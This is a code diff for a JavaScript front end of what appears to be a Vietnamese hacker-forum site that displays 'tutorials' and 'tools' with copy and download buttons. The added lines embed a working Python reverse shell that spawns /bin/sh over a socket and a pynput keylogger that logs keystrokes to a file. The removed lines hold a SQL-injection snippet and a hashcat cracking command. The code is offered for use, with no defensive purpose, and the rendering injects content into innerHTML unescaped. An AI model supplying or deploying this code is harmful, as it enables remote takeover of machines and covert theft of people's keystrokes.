@@ -1,113 +1,111 @@
 const posts = {
   news: [
-    { 
-      title: "📡 Hacker VN News 2025", 
-      content: "Tin tức mới nhất về an ninh mạng Việt Nam.", 
-      link: "https://example.com/news1" 
-    },
-    { 
-      title: "🔥 Zero-Day Exploit", 
-      content: "Phát hiện lỗ hổng mới trong Windows.", 
-      link: "https://example.com/news2" 
+    {
+      title: "Tin nóng Hacker Malware",
+      content: "Hacker Malware vừa ra mắt diễn đàn mới với nhiều công cụ và tutorial.",
+      type: "news"
     }
   ],
+
   tutorials: [
-    { 
-      title: "💻 SQL Injection Tutorial", 
-      code: "SELECT * FROM users WHERE username = 'admin' --;" 
-    },
-    { 
-      title: "🔐 Password Cracking", 
-      code: "hashcat -a 0 -m 0 hash.txt wordlist.txt" 
+    {
+      title: "Cách viết shell đơn giản",
+      content: `
+# Python Reverse Shell
+import socket,subprocess,os
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("127.0.0.1",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+      `,
+      type: "tutorial"
     }
   ],
+
   tools: [
-    { 
-      title: "🛠 Recon Tool", 
-      displayCode: "python recon.py --target example.com",   // hiển thị trên web
-      downloadCode: `# recon.py
-import requests
-
-def scan(target):
-    print(f"Scanning target: {target}")
-    try:
-        r = requests.get(f"http://{target}")
-        print("Status:", r.status_code)
-    except:
-        print("Error connecting")
-
-if __name__ == "__main__":
-    scan("example.com")`,
-      filename: "recon.py"
+    {
+      title: "Simple Exploit Tool",
+      content: `
+#!/bin/bash
+echo "[*] Exploit running..."
+id
+whoami
+      `,
+      type: "tool",
+      filename: "exploit.sh"
     },
-    { 
-      title: "🐞 Exploit Framework", 
-      displayCode: "python exploit.py --rhost 127.0.0.1 --rport 8080",  // hiển thị
-      downloadCode: `# exploit.py
-import socket
+    {
+      title: "Keylogger Python",
+      content: `
+from pynput import keyboard
 
-def exploit(rhost, rport):
-    print(f"Exploiting {rhost}:{rport}")
-    s = socket.socket()
-    s.connect((rhost, int(rport)))
-    payload = b"A" * 1024
-    s.send(payload)
-    print("Payload sent!")
+def on_press(key):
+    with open("keys.txt", "a") as f:
+        f.write(str(key) + "\\n")
 
-if __name__ == "__main__":
-    exploit("127.0.0.1", 8080)`,
-      filename: "exploit.py"
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+      `,
+      type: "tool",
+      filename: "keylogger.py"
     }
   ]
 };
 
-// ====== Utility functions ======
-function copyCode(code) {
-  navigator.clipboard.writeText(code).then(() => {
-    alert("✅ Code copied to clipboard!");
+// ==== Render Function ====
+function renderPosts(tabId) {
+  const container = document.getElementById(tabId);
+  container.innerHTML = "";
+
+  posts[tabId].forEach((post, index) => {
+    let html = `
+      <div class="card">
+        <h2>${post.title}</h2>
+    `;
+
+    if (post.type === "news") {
+      html += `<p>${post.content}</p><button class="btn-sm">Read</button>`;
+    }
+
+    if (post.type === "tutorial") {
+      html += `
+        <pre><code id="tut-${index}">${post.content.trim()}</code></pre>
+        <button class="btn-sm" onclick="copyCode('tut-${index}')">Copy</button>
+      `;
+    }
+
+    if (post.type === "tool") {
+      html += `
+        <pre><code id="tool-${index}">${post.content.trim()}</code></pre>
+        <button class="btn-sm" onclick="copyCode('tool-${index}')">Copy</button>
+        <button class="btn-sm" onclick="downloadCode('tool-${index}','${post.filename}')">Download</button>
+      `;
+    }
+
+    html += `</div>`;
+    container.innerHTML += html;
   });
 }
 
-function downloadCode(filename, code) {
-  const blob = new Blob([code], { type: "text/plain" });
+// ==== Copy Function ====
+window.copyCode = function(id) {
+  const code = document.getElementById(id).innerText;
+  navigator.clipboard.writeText(code).then(() => {
+    alert("✅ Copied!");
+  });
+};
+
+// ==== Download Function ====
+window.downloadCode = function(id, filename) {
+  const code = document.getElementById(id).innerText;
+  const blob = new Blob([code], { type: "text/plain;charset=utf-8" });
   const link = document.createElement("a");
   link.href = URL.createObjectURL(blob);
-  link.download = filename;
+  link.download = filename || "code.txt";
+  document.body.appendChild(link);
   link.click();
-}
-
-// ====== Render posts ======
-function renderPosts() {
-  // News
-  document.getElementById("news").innerHTML = posts.news.map(p => `
-    <div class="card">
-      <h2>${p.title}</h2>
-      <p>${p.content}</p>
-      <button onclick="window.open('${p.link}','_blank')" class="tab-btn">Read</button>
-    </div>
-  `).join("");
-
-  // Tutorials
-  document.getElementById("tutorials").innerHTML = posts.tutorials.map(p => `
-    <div class="card">
-      <h2>${p.title}</h2>
-      <pre><code class="language-bash">${p.code}</code></pre>
-      <button onclick="copyCode(\`${p.code}\`)" class="tab-btn">Copy</button>
-    </div>
-  `).join("");
-
-  // Tools
-  document.getElementById("tools").innerHTML = posts.tools.map(p => `
-    <div class="card">
-      <h2>${p.title}</h2>
-      <pre><code class="language-python">${p.displayCode}</code></pre>
-      <button onclick="copyCode(\`${p.displayCode}\`)" class="tab-btn">Copy</button>
-      <button onclick="downloadCode('${p.filename}', \`${p.downloadCode}\`)" class="tab-btn">Download</button>
-    </div>
-  `).join("");
-
-  // Kích hoạt highlight.js
-  document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
-}
-
-renderPosts();
+  document.body.removeChild(link);
+};
